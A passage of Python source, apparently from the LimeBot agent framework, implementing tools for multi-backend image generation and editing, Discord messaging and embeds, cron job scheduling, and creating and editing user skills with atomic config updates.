            "stream": True,
            "input": [
                {
                    "role": "user",
                    "content": input_content,
                }
            ],
            "tools": [{"type": "image_generation"}],
            "tool_choice": {"type": "image_generation"},
        }
        headers = {
            "Authorization": f"Bearer {token}",
            "chatgpt-account-id": account_id,
            "originator": "limebot",
            "OpenAI-Beta": "responses=experimental",
            "accept": "text/event-stream",
            "content-type": "application/json",
        }

        images: List[Dict[str, str]] = []
        async with httpx.AsyncClient(timeout=180.0) as client:
            for _ in range(count):
                async with client.stream(
                    "POST",
                    "https://chatgpt.com/backend-api/codex/responses",
                    headers=headers,
                    json=payload,
                ) as response:
                    if response.status_code >= 400:
                        detail = await response.aread()
                        text = detail.decode("utf-8", errors="replace").strip()
                        raise RuntimeError(
                            f"Codex image generation failed ({response.status_code}): {text}"
                        )

                    async for line in response.aiter_lines():
                        if not line.startswith("data:"):
                            continue
                        raw = line.removeprefix("data:").strip()
                        if not raw or raw == "[DONE]":
                            continue
                        try:
                            event = json.loads(raw)
                        except Exception:
                            continue
                        if event.get("type") == "response.failed":
                            error = (event.get("response") or {}).get("error") or {}
                            message = error.get("message") or json.dumps(event)[:500]
                            raise RuntimeError(f"Codex image generation failed: {message}")
                        item = event.get("item") or {}
                        if item.get("type") != "image_generation_call":
                            continue
                        b64 = item.get("result") or item.get("b64_json")
                        if b64:
                            images.append({"b64": b64, "mime_type": "image/png"})
                            break
        return images

    async def _generate_gemini_image(
        self,
        prompt: str,
        model: str,
        count: int,
        size: str,
        references: Optional[List[Dict[str, Any]]] = None,
    ) -> List[Dict[str, str]]:
        from core.llm_utils import get_api_key_for_model

        import httpx

        api_key = get_api_key_for_model(model)
        if not api_key:
            raise RuntimeError("GEMINI_API_KEY is not configured.")

        bare_model = model.split("/", 1)[-1]
        generation_config: Dict[str, Any] = {"responseModalities": ["Image"]}
        aspect_ratio = self._gemini_aspect_ratio(size)
        if aspect_ratio:
            generation_config["responseFormat"] = {
                "image": {"aspectRatio": aspect_ratio}
            }

        url = (
            "https://generativelanguage.googleapis.com/v1/models/"
            f"{bare_model}:generateContent"
        )
        parts: List[Dict[str, Any]] = [{"text": prompt}]
        parts.extend(
            {
                "inlineData": {
                    "mimeType": reference["mime_type"],
                    "data": base64.b64encode(reference["bytes"]).decode("ascii"),
                }
            }
            for reference in (references or [])
        )
        payload = {
            "contents": [{"parts": parts}],
            "generationConfig": generation_config,
        }
        images: List[Dict[str, str]] = []
        async with httpx.AsyncClient(timeout=120.0) as client:
            for _ in range(count):
                response = await client.post(
                    url,
                    params={"key": api_key},
                    json=payload,
                )
                response.raise_for_status()
                data = response.json()
                for candidate in data.get("candidates", []) or []:
                    content = candidate.get("content", {}) or {}
                    for part in content.get("parts", []) or []:
                        inline = part.get("inlineData") or part.get("inline_data")
                        if not isinstance(inline, dict):
                            continue
                        b64 = inline.get("data")
                        if not b64:
                            continue
                        images.append(
                            {
                                "b64": b64,
                                "mime_type": inline.get("mimeType")
                                or inline.get("mime_type")
                                or "image/png",
                            }
                        )
        return images

    async def _generate_litellm_image(
        self,
        prompt: str,
        model: str,
        count: int,
        size: str,
        quality: str,
    ) -> List[Dict[str, str]]:
        from core.llm_utils import get_api_key_for_model
        from litellm import aimage_generation

        import httpx

        api_key = get_api_key_for_model(model)
        litellm_model = model
        if model.startswith("openai/"):
            litellm_model = model.removeprefix("openai/")

        kwargs: Dict[str, Any] = {
            "prompt": prompt,
            "model": litellm_model,
            "n": count,
            "size": size,
            "timeout": 180,
        }
        if api_key:
            kwargs["api_key"] = api_key
        if quality and quality != "auto":
            kwargs["quality"] = quality
        if not model.startswith(("gemini/", "google/")):
            bare = str(model or "").split("/", 1)[-1]
            if not (
                bare.startswith("gpt-image-")
                or bare == "chatgpt-image-latest"
            ):
                kwargs["response_format"] = "b64_json"

        response = await aimage_generation(**kwargs)
        data = getattr(response, "data", None)
        if data is None and isinstance(response, dict):
            data = response.get("data")

        images: List[Dict[str, str]] = []
        for item in data or []:
            b64 = getattr(item, "b64_json", None)
            url = getattr(item, "url", None)
            if isinstance(item, dict):
                b64 = item.get("b64_json") or item.get("b64")
                url = item.get("url")
            if b64:
                images.append({"b64": b64, "mime_type": "image/png"})
                continue
            if url:
                async with httpx.AsyncClient(timeout=120.0) as client:
                    downloaded = await client.get(url)
                    downloaded.raise_for_status()
                    mime_type = downloaded.headers.get("content-type", "image/png")
                    images.append(
                        {
                            "b64": base64.b64encode(downloaded.content).decode("ascii"),
                            "mime_type": mime_type,
                        }
                    )
        return images

    async def _generate_openai_image_edit(
        self,
        prompt: str,
        model: str,
        count: int,
        size: str,
        quality: str,
        references: List[Dict[str, Any]],
    ) -> List[Dict[str, str]]:
        """Call the native Images edit endpoint with one or more references."""
        from core.llm_utils import get_api_key_for_model

        import httpx

        api_key = get_api_key_for_model(model)
        if not api_key:
            raise RuntimeError("OPENAI_API_KEY is not configured for image editing.")

        bare_model = model.removeprefix("openai/")
        form: Dict[str, str] = {
            "model": bare_model,
            "prompt": prompt,
            "n": str(count),
            "size": size,
        }
        if quality and quality != "auto":
            form["quality"] = quality
        files = [
            (
                "image[]",
                (
                    reference["name"],
                    reference["bytes"],
                    reference["mime_type"],
                ),
            )
            for reference in references
        ]
        async with httpx.AsyncClient(timeout=180.0) as client:
            response = await client.post(
                "https://api.openai.com/v1/images/edits",
                headers={"Authorization": f"Bearer {api_key}"},
                data=form,
                files=files,
            )
            if response.status_code >= 400:
                try:
                    error = response.json().get("error") or {}
                    detail = str(error.get("message") or "Image edit request failed.")
                except Exception:
                    detail = "Image edit request failed."
                raise RuntimeError(
                    f"OpenAI image edit failed ({response.status_code}): {detail[:500]}"
                )
            payload = response.json()

        images: List[Dict[str, str]] = []
        for item in payload.get("data", []) or []:
            b64 = item.get("b64_json") if isinstance(item, dict) else None
            url = item.get("url") if isinstance(item, dict) else None
            if b64:
                images.append({"b64": b64, "mime_type": "image/png"})
                continue
            if url:
                async with httpx.AsyncClient(timeout=120.0) as client:
                    downloaded = await client.get(url)
                    downloaded.raise_for_status()
                    images.append(
                        {
                            "b64": base64.b64encode(downloaded.content).decode(
                                "ascii"
                            ),
                            "mime_type": downloaded.headers.get(
                                "content-type", "image/png"
                            ),
                        }
                    )
        return images

    async def _publish_generated_image_preview(
        self,
        paths: List[Path],
        caption: str,
    ) -> None:
        if not paths:
            return

        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        channel = (ctx.get("channel") or "").strip().lower()
        chat_id = (ctx.get("chat_id") or "").strip()
        if not channel or not chat_id:
            return

        first_path = paths[0]
        relative_url = ""
        try:
            relative_url = f"/temp/{first_path.relative_to(Path('temp').resolve()).as_posix()}"
        except ValueError:
            relative_url = ""
        mime_type = mimetypes.guess_type(first_path.name)[0] or "image/png"
        attachment = {
            "name": first_path.name,
            "kind": "image",
            "mime_type": mime_type,
            "mimeType": mime_type,
            "path": self._to_display_path(first_path),
            "url": relative_url or self._to_display_path(first_path),
        }

        if channel in {"discord", "whatsapp"}:
            await self.bus.publish_outbound(
                OutboundMessage(
                    channel=channel,
                    chat_id=chat_id,
                    content="",
                    metadata={
                        "type": "file",
                        "file_path": str(first_path),
                        "caption": caption,
                    },
                )
            )
            return

        if channel == "web":
            try:
                image_url = attachment["url"]
                if not image_url.startswith(("/temp/", "data:", "http://", "https://")):
                    blob = await asyncio.to_thread(first_path.read_bytes)
                    image_url = (
                        f"data:{mime_type};base64,"
                        f"{base64.b64encode(blob).decode('ascii')}"
                    )
                    attachment["url"] = image_url
                await self.bus.publish_outbound(
                    OutboundMessage(
                        channel=channel,
                        chat_id=chat_id,
                        content=caption,
                        metadata={"image": image_url, "attachments": [attachment]},
                    )
                )
            except Exception as e:
                logger.warning(f"Failed to publish generated image preview: {e}")

    async def generate_image(
        self,
        prompt: str,
        model: str = "",
        size: str = "",
        quality: str = "",
        count: int = 1,
        reference_images: Optional[List[str]] = None,
        use_attached_images: Optional[bool] = None,
    ) -> str:
        """Generate or edit image files using text and optional references."""
        prompt = str(prompt or "").strip()
        if not prompt:
            return "Error: prompt is required."
        if self._is_negated_image_generation_prompt(prompt):
            return (
                "ACTION BLOCKED: The image prompt explicitly says that no image "
                "should be generated. Continue without calling generate_image."
            )

        image_cfg = getattr(self.config, "image_generation", None)
        requested_model = model or getattr(image_cfg, "model", "") or ""
        size = str(size or getattr(image_cfg, "size", "") or "1024x1024").strip()
        quality = (
            str(quality or getattr(image_cfg, "quality", "") or "auto")
            .strip()
            .lower()
        )
        try:
            count = max(1, min(int(count or 1), 4))
        except Exception:
            count = 1

        try:
            references, reference_requested = await self._resolve_image_references(
                reference_images, use_attached_images
            )
        except (OSError, ValueError) as exc:
            return f"Error: {exc}"
        if reference_requested and not references:
            return (
                "Error: The requested reference image is no longer available. "
                "Attach it again and retry."
            )

        candidates = self._image_model_candidates(requested_model)
        if not candidates:
            return (
                "Error: no image generation backend is configured. "
                "Configure Codex OAuth, OPENAI_API_KEY, or GEMINI_API_KEY."
            )

        errors: List[str] = []
        images: List[Dict[str, str]] = []
        used_model = ""
        for candidate in candidates:
            try:
                if self._is_gemini_image_model(candidate):
                    candidate_images = await self._generate_gemini_image(
                        prompt, candidate, count, size, references
                    )
                elif candidate.startswith("openai-codex/"):
                    candidate_images = await self._generate_codex_image(
                        prompt, candidate, count, size, quality, references
                    )
                elif self._is_openai_image_model(candidate):
                    if references:
                        candidate_images = await self._generate_openai_image_edit(
                            prompt,
                            candidate,
                            count,
                            size,
                            quality,
                            references,
                        )
                    else:
                        candidate_images = await self._generate_litellm_image(
                            prompt, candidate, count, size, quality
                        )
                else:
                    candidate_images = await self._generate_codex_image(
                        prompt, candidate, count, size, quality, references
                    )

                if candidate_images:
                    images = candidate_images
                    used_model = candidate
                    break
                errors.append(f"{candidate}: returned no image data")
            except Exception as e:
                logger.warning(f"Image generation attempt failed with {candidate}: {e}")
                errors.append(f"{candidate}: {e}")

        if not images:
            return (
                "Error: image generation failed for all configured backends. "
                + "; ".join(errors[:4])
            )

        output_dir = Path("temp/generated_images").resolve()
        if not self._is_path_allowed(output_dir):
            return "Error: Generated image output directory is not allowed."
        await asyncio.to_thread(output_dir.mkdir, parents=True, exist_ok=True)

        saved: List[Path] = []
        for idx, image in enumerate(images[:count], start=1):
            mime_type = image.get("mime_type") or "image/png"
            ext = self._image_extension_for_mime(mime_type)
            file_name = (
                f"generated_{datetime.now().strftime('%Y%m%d_%H%M%S')}_"
                f"{uuid.uuid4().hex[:8]}_{idx}{ext}"
            )
            out_path = output_dir / file_name
            blob = base64.b64decode(image["b64"])
            await asyncio.to_thread(out_path.write_bytes, blob)
            saved.append(out_path)

        display_paths = [self._to_display_path(path) for path in saved]
        caption = f"Generated image: {display_paths[0]}"
        await self._publish_generated_image_preview(saved, caption)

        return json.dumps(
            {
                "status": "ok",
                "model": used_model,
                "count": len(saved),
                "reference_count": len(references),
                "paths": display_paths,
                "note": "Generated images were saved locally and sent to the active chat when supported.",
            }
        )

    async def send_discord_message(
        self,
        message: str = "",
        channel_id: str = "",
        user_id: str = "",
    ) -> str:
        """Send a plain Discord message to a channel or user DM."""
        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        active_channel = (ctx.get("channel") or "").strip().lower()
        origin_chat_id = str(ctx.get("chat_id") or "").strip()
        target_channel = str(channel_id or "").strip()
        target_user = str(user_id or "").strip()

        if target_channel and target_user:
            return "Error: Pass either channel_id or user_id, not both."

        target_id = target_user or target_channel
        target_kind = "user DM" if target_user else "channel"

        if not target_id:
            if active_channel != "discord":
                return (
                    "Error: channel_id or user_id is required when sending a Discord message outside a Discord conversation."
                )
            target_id = str(ctx.get("chat_id") or "").strip()
            target_kind = "current Discord chat"

        if not target_id or not target_id.isdigit():
            return "Error: Discord channel_id or user_id must be numeric."

        message = str(message or "").strip()
        if not message:
            return "Error: message is required."

        await self.bus.publish_outbound(
            OutboundMessage(
                channel="discord",
                chat_id=target_id,
                content=message,
                metadata={
                    "target_type": "dm" if target_user else "channel",
                    "from_tool": "send_discord_message",
                    "origin_channel": active_channel or None,
                    "origin_chat_id": origin_chat_id or None,
                },
            )
        )
        return f"Sent Discord message to {target_kind} {target_id}."

    async def send_discord_embed(
        self,
        title: str = "",
        description: str = "",
        color: str = "#5865F2",
        footer: str = "",
        image: str = "",
        thumbnail: str = "",
        fields: Optional[List[Dict[str, Any]]] = None,
        channel_id: str = "",
        user_id: str = "",
    ) -> str:
        """Send a native Discord embed via the live Discord channel."""
        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        active_channel = (ctx.get("channel") or "").strip().lower()
        origin_chat_id = str(ctx.get("chat_id") or "").strip()
        target_channel = str(channel_id or "").strip()
        target_user = str(user_id or "").strip()

        if target_channel and target_user:
            return "Error: Pass either channel_id or user_id, not both."

        target_id = target_user or target_channel
        target_kind = "user DM" if target_user else "channel"

        if not target_id:
            if active_channel != "discord":
                return (
                    "Error: channel_id or user_id is required when sending a Discord embed outside a Discord conversation."
                )
            target_id = str(ctx.get("chat_id") or "").strip()
            target_kind = "current Discord chat"

        if not target_id or not target_id.isdigit():
            return "Error: Discord channel_id or user_id must be numeric."

        title = str(title or "").strip()
        description = str(description or "").strip()
        if not title and not description:
            return "Error: title or description is required for a Discord embed."
        if title and len(title) > 256:
            return f"Error: Embed title exceeds 256 characters ({len(title)})."
        if description and len(description) > 4096:
            return f"Error: Embed description exceeds 4096 characters ({len(description)})."

        color = str(color or "#5865F2").strip()
        if not re.fullmatch(r"#[0-9A-Fa-f]{6}", color):
            return f"Error: Invalid color '{color}'. Expected #RRGGBB."

        normalized_fields: List[Dict[str, Any]] = []
        for field in fields or []:
            if not isinstance(field, dict):
                return "Error: Each embed field must be an object."
            name = str(field.get("name") or "").strip()
            value = str(field.get("value") or "").strip()
            if not name or not value:
                return "Error: Each embed field requires both name and value."
            normalized_fields.append(
                {
                    "name": name[:256],
                    "value": value[:1024],
                    "inline": bool(field.get("inline", False)),
                }
            )

        embed_data = {
            "title": title,
            "description": description,
            "color": color,
            "footer": str(footer or "").strip() or None,
            "image": str(image or "").strip() or None,
            "thumbnail": str(thumbnail or "").strip() or None,
            "fields": normalized_fields,
        }
        fallback = title or description[:100]
        await self.bus.publish_outbound(
            OutboundMessage(
                channel="discord",
                chat_id=target_id,
                content=fallback,
                metadata={
                    "embed": embed_data,
                    "target_type": "dm" if target_user else "channel",
                    "from_tool": "send_discord_embed",
                    "origin_channel": active_channel or None,
                    "origin_chat_id": origin_chat_id or None,
                },
            )
        )
        return f"Sent native Discord embed to {target_kind} {target_id}."

    async def list_discord_channels(self) -> str:
        """List Discord guilds and text channels available to the running bot."""
        discord_channel = self._get_channel_by_name("discord")
        if not discord_channel:
            return "Error: Discord channel is not active."

        client = getattr(discord_channel, "client", None)
        if not client or not client.is_ready():
            return "Error: Discord client is not ready."

        guilds_payload: List[Dict[str, Any]] = []
        for guild in getattr(client, "guilds", []) or []:
            text_channels = []
            for ch in getattr(guild, "channels", []) or []:
                if str(getattr(ch, "type", "")) != "text":
                    continue
                text_channels.append(
                    {
                        "id": str(getattr(ch, "id", "")),
                        "name": getattr(ch, "name", ""),
                        "type": str(getattr(ch, "type", "")),
                    }
                )
            guilds_payload.append(
                {
                    "id": str(getattr(guild, "id", "")),
                    "name": getattr(guild, "name", ""),
                    "channels": text_channels,
                }
            )

        return json.dumps({"guilds": guilds_payload}, ensure_ascii=False)

    async def cron_add(
        self,
        message: str,
        context: Dict[str, Any],
        time_expr: str = None,
        cron_expr: str = None,
        tz: str = None,
        name: str = None,
    ) -> str:
        """Add a scheduled task."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            trigger_time = None
            if time_expr:
                import time as time_module

                delta_seconds = 0
                if time_expr.endswith("s"):
                    delta_seconds = int(time_expr[:-1])
                elif time_expr.endswith("m"):
                    delta_seconds = int(time_expr[:-1]) * 60
                elif time_expr.endswith("h"):
                    delta_seconds = int(time_expr[:-1]) * 3600
                elif time_expr.endswith("d"):
                    delta_seconds = int(time_expr[:-1]) * 86400
                else:
                    return f"Error: Invalid time format '{time_expr}'. Use '10s', '5m', '2h'."
                trigger_time = time_module.time() + delta_seconds

            job_id = await self.scheduler.add_job(
                trigger_time=trigger_time,
                message=message,
                context=context,
                cron_expr=cron_expr,
                tz=tz,
                name=name,
            )
            return f"Success: Scheduled job {job_id}"
        except Exception as e:
            return f"Error adding cron: {e}"

    async def cron_list(self) -> str:
        """List all pending scheduled tasks."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            jobs = await self.scheduler.list_jobs()
            if not jobs:
                return "No scheduled tasks."

            res = ["Scheduled Jobs:"]
            for j in jobs:
                trigger_str = (
                    datetime.fromtimestamp(j["trigger"]).strftime("%Y-%m-%d %H:%M:%S")
                    if j.get("trigger")
                    else "N/A"
                )
                recur = f" (RECURS: {j['cron_expr']})" if j.get("cron_expr") else ""
                status = "PAUSED" if j.get("active") is False else "ACTIVE"
                state = j.get("state") or {}
                last_status = state.get("lastStatus") or state.get("last_status")
                duration = state.get("lastDurationMs") or state.get("last_duration_ms")
                name = j.get("name") or j["id"]
                state_bits = []
                if last_status:
                    state_bits.append(f"last={last_status}")
                if duration is not None:
                    state_bits.append(f"{duration}ms")
                state_suffix = f" [{' '.join(state_bits)}]" if state_bits else ""
                res.append(
                    f" - [{j['id']}] [{status}] {name}: {trigger_str}{recur}{state_suffix}\n"
                    f"   {j['payload']}"
                )
            return "\n".join(res)
        except Exception as e:
            return f"Error listing cron: {e}"

    async def cron_remove(self, job_id: str) -> str:
        """Remove a scheduled task by ID."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            if await self.scheduler.remove_job(job_id):
                return f"Success: Removed job {job_id}."
            return f"Error: Job {job_id} not found."
        except Exception as e:
            return f"Error removing cron: {e}"

    async def cron_deactivate(self, job_id: str) -> str:
        """Pause a scheduled task by ID."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            updated = await self.scheduler.set_job_active(job_id, False)
            if updated:
                return f"Success: Deactivated job {job_id}."
            return f"Error: Job {job_id} not found."
        except Exception as e:
            return f"Error deactivating cron: {e}"

    async def cron_activate(self, job_id: str) -> str:
        """Resume a scheduled task by ID."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            updated = await self.scheduler.set_job_active(job_id, True)
            if updated:
                return f"Success: Activated job {job_id}."
            return f"Error: Job {job_id} not found."
        except Exception as e:
            return f"Error activating cron: {e}"

    @staticmethod
    def _persist_enabled_skill_sync(name: str) -> Optional[bytes]:
        """Add a local skill to limebot.json with an atomic replacement."""

        config_path = get_config_file()
        previous_bytes = config_path.read_bytes() if config_path.exists() else None
        config: Dict[str, Any] = {}
        if config_path.exists():
            try:
                loaded = json.loads(config_path.read_text(encoding="utf-8"))
                if isinstance(loaded, dict):
                    config = loaded
            except (OSError, ValueError):
                raise RuntimeError("The LimeBot configuration could not be read.") from None

        skills = config.setdefault("skills", {})
        if not isinstance(skills, dict):
            raise RuntimeError("The LimeBot skills configuration is invalid.")
        enabled = skills.setdefault("enabled", [])
        if not isinstance(enabled, list):
            raise RuntimeError("The LimeBot enabled-skills configuration is invalid.")
        if name not in enabled:
            enabled.append(name)

        config_path.parent.mkdir(parents=True, exist_ok=True)
        temporary: Optional[Path] = None
        try:
            with tempfile.NamedTemporaryFile(
                mode="w",
                encoding="utf-8",
                newline="",
                dir=str(config_path.parent),
                prefix=f".{config_path.name}.limebot-",
                suffix=".tmp",
                delete=False,
            ) as handle:
                temporary = Path(handle.name)
                handle.write(json.dumps(config, indent=2, ensure_ascii=False))
                handle.write("\n")
                handle.flush()
                os.fsync(handle.fileno())
            os.replace(temporary, config_path)
            temporary = None
        finally:
            if temporary is not None:
                temporary.unlink(missing_ok=True)
        return previous_bytes

    @staticmethod
    def _restore_config_sync(path: Path, previous_bytes: Optional[bytes]) -> None:
        """Restore the config snapshot captured before a skill was created."""

        if previous_bytes is None:
            path.unlink(missing_ok=True)
            return
        temporary: Optional[Path] = None
        try:
            with tempfile.NamedTemporaryFile(
                mode="wb",
                dir=str(path.parent),
                prefix=f".{path.name}.limebot-restore-",
                suffix=".tmp",
                delete=False,
            ) as handle:
                temporary = Path(handle.name)
                handle.write(previous_bytes)
                handle.flush()
                os.fsync(handle.fileno())
            os.replace(temporary, path)
            temporary = None
        finally:
            if temporary is not None:
                temporary.unlink(missing_ok=True)

    async def inspect_skill(
        self,
        skill_name: str,
        path: Optional[str] = None,
        start_line: Optional[int] = None,
        end_line: Optional[int] = None,
    ) -> str:
        """Return bounded, redacted information about a registered skill."""

        registry = getattr(self.agent, "skill_registry", None)
        if registry is None:
            return json.dumps(
                {"status": "error", "code": "skill_registry_unavailable"},
                ensure_ascii=False,
            )
        from core.skill_editor import SkillEditError, SkillEditor

        try:
            result = await asyncio.to_thread(
                SkillEditor(registry, self.agent).inspect,
                skill_name,
                path,
                start_line,
                end_line,
            )
        except SkillEditError as exc:
            result = {"status": "error", "code": exc.code, "message": exc.message}
        except Exception:
            result = {
                "status": "error",
                "code": "skill_inspection_failed",
                "message": "The skill could not be inspected.",
            }
        return json.dumps(result, ensure_ascii=False)

    async def edit_skill(self, skill_name: str, changes: Any) -> str:
        """Apply a validated transactional edit to a user-owned skill."""

        registry = getattr(self.agent, "skill_registry", None)
        if registry is None:
            return json.dumps(
                {"status": "error", "code": "skill_registry_unavailable"},
                ensure_ascii=False,
            )
        from core.skill_editor import SkillEditError, SkillEditor

        try:
            result = await asyncio.to_thread(
                SkillEditor(registry, self.agent).edit,
                skill_name,
                changes,
            )
        except SkillEditError as exc:
            result = {"status": "error", "code": exc.code, "message": exc.message}
        except Exception:
            result = {
                "status": "error",
                "code": "skill_edit_failed",
                "message": "The skill edit failed and was not applied.",
            }
        return json.dumps(result, ensure_ascii=False)

    async def create_skill(self, name: str, description: str) -> str:
        """Initialize and enable a new skill in user-owned local storage."""

        if not re.match(r"^[a-z0-9_]+$", str(name or "")):
            return "Error: Skill name must be snake_case (alphanumeric and underscores only)."
        if not isinstance(description, str) or not description.strip():
            return "Error: Skill description is required."
        if len(description) > 1_000 or "\n" in description or "\r" in description:
            return "Error: Skill description must be one line and at most 1000 characters."

        workspace_root, _ = self._active_workspace_paths()
        skill_parent = (workspace_root / "skills") if workspace_root is not None else get_skills_dir()
        if skill_parent.exists() and (
            skill_parent.is_symlink() or os.path.islink(str(skill_parent))
        ):
            return "Error: The local skill directory is a symlink and cannot be used."
        skill_dir = skill_parent / name
        if skill_dir.exists() or skill_dir.is_symlink():
            return f"Error: Skill '{name}' already exists."

        content = (
            f"---\n"
            f"name: {name}\n"
            f"description: {description}\n"
            f"version: 1.0.0\n"
            f"---\n\n"
            f"# {name.replace('_', ' ').title()}\n\n"
            f"{description}\n\n"
            f"## Usage\n"
            f"Describe how to use this skill here.\n"
        )
        config_snapshot: Optional[bytes] = None
        config_persisted = False
        try:
            skill_dir.mkdir(parents=True, exist_ok=False)
            await asyncio.to_thread(
                self._atomic_write_text_sync,
                skill_dir / "SKILL.md",
                content,
            )

            if workspace_root is None:
                config_snapshot = await asyncio.to_thread(
                    self._persist_enabled_skill_sync, name
                )
                config_persisted = True
                skills_cfg = getattr(self.config, "skills", None)
                if skills_cfg is not None:
                    enabled = getattr(skills_cfg, "enabled", None)
                    if not isinstance(enabled, list):
                        enabled = []
                        setattr(skills_cfg, "enabled", enabled)
                    if name not in enabled:
                        enabled.append(name)
                if self.agent and hasattr(self.agent, "skill_registry"):
                    await asyncio.to_thread(self.agent.skill_registry.discover_and_load)
                    if hasattr(self.agent, "_refresh_tool_definitions"):
                        self.agent._refresh_tool_definitions()
                return json.dumps(
                    {
                        "status": "success",
                        "code": "skill_created",
                        "skill": name,
                        "source_kind": "local",
                        "editable": True,
                        "files": ["SKILL.md"],
                    },
                    ensure_ascii=False,
                )

            return json.dumps(
                {
                    "status": "success",
                    "code": "skill_created",
                    "skill": name,
                    "source_kind": "local",
                    "editable": True,
                    "files": ["SKILL.md"],
                    "isolated_workspace": True,
                },
                ensure_ascii=False,
            )
        except Exception:
            try:
                shutil.rmtree(skill_dir, ignore_errors=True)
            except OSError:
                pass
            if config_persisted:
                try:
                    await asyncio.to_thread(
                        self._restore_config_sync, get_config_file(), config_snapshot
                    )
                except Exception:
                    pass
                skills_cfg = getattr(self.config, "skills", None)
                enabled = getattr(skills_cfg, "enabled", None) if skills_cfg else None
                if isinstance(enabled, list) and name in enabled:
                    enabled.remove(name)
            return json.dumps(
                {
                    "status": "error",
                    "code": "skill_create_failed",
                    "message": "The skill was not created.",
                },
                ensure_ascii=False,
            )
